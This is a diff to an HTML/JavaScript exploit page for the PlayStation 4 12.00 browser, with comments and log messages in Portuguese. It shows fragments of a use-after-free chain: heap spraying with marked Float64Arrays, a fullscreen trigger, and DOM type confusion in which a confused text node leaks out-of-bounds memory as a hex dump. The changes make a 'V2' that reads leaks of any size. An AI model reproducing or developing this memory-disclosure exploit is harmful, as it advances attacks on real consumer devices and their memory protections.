@@ -1,13 +1,12 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - OOB Read Memory Dumper</title>
+<title>PS4 12.00 - OOB Read Memory Dumper V2</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF → OOB Read → Memory Dumper</h2>
+<h2>UAF → OOB Read → Memory Dumper V2</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
@@ -26,7 +25,7 @@ function setupHeap(){
     let arr=[];
     for(let i=0;i<5000;i++){
         let a=new Float64Array(8);
-        a[0]= 0x1337BEEF; // Usamos uma assinatura mágica fácil de achar na memória
+        a[0]= 0x1337BEEF; 
         arr.push(a);
     }
     return arr;
@@ -78,7 +77,7 @@ function inject(child){
 }
 
 // ==========================
-// 🔬 OOB READ PROBE (O RADAR)
+// 🔬 OOB READ PROBE V2 (SEM TRAVAS)
 function domOverlapProbe(fsTarget){
     log("---- MEMORY DUMP PROBE ----");
 
@@ -87,35 +86,31 @@ function domOverlapProbe(fsTarget){
         if(!n) return;
 
         if(n.nodeType === 3){
-            log("[!!!] TEXTNODE CONFUSION (Preparando Leitura...)");
+            log("[!!!] TEXTNODE CONFUSION (Lendo...)");
 
             try{
-                // Em vez de ESCREVER, nós LEMOS o que o TextNode confuso acha que é o texto dele!
                 let leakedData = n.data; 
                 
                 if(!leakedData){
-                    log("[SCAN] Vazamento vazio (null/undefined)");
+                    log("[SCAN] Vazamento vazio");
                     return;
                 }
 
                 log("[LEAK] Tamanho do buffer vazado: " + leakedData.length + " bytes");
 
-                if(leakedData.length > 10){
-                    // Transforma os primeiros 50 caracteres do vazamento em códigos Hexadecimais para analisarmos
+                // 🔥 CORREÇÃO: Lê qualquer coisa maior que 0!
+                if(leakedData.length > 0){
                     let hexDump = [];
+                    // Pega até 50 caracteres (se tiver)
                     for(let i=0; i < Math.min(leakedData.length, 50); i++){
                         hexDump.push(leakedData.charCodeAt(i).toString(16).padStart(4, '0'));
                     }
                     
                     log("[DUMP] " + hexDump.join(" "));
 
-                    // Procura por assinaturas conhecidas no texto vazado
                     if(leakedData.includes("CONTROL")){
                         log("[$$$] Lendo memória do RECLAIM (DOM Vizinho!)");
                     }
-                    
-                    // Nota: 0x1337BEEF em floats ou ponteiros vai parecer lixo, 
-                    // mas podemos analisar o hexDump depois.
                 }
 
             }catch(e){
@@ -159,9 +154,8 @@ function trigger(fsTarget){
 // ==========================
 // MAIN
 function runTest(){
-    log("[*] Iniciando teste (Memory Dump)...");
+    log("[*] Iniciando teste (Memory Dump V2)...");
     
-    // Mantém a pressão de memória
     window.heap_press = setupHeap(); 
 
     let fsTarget=setupFullscreen();
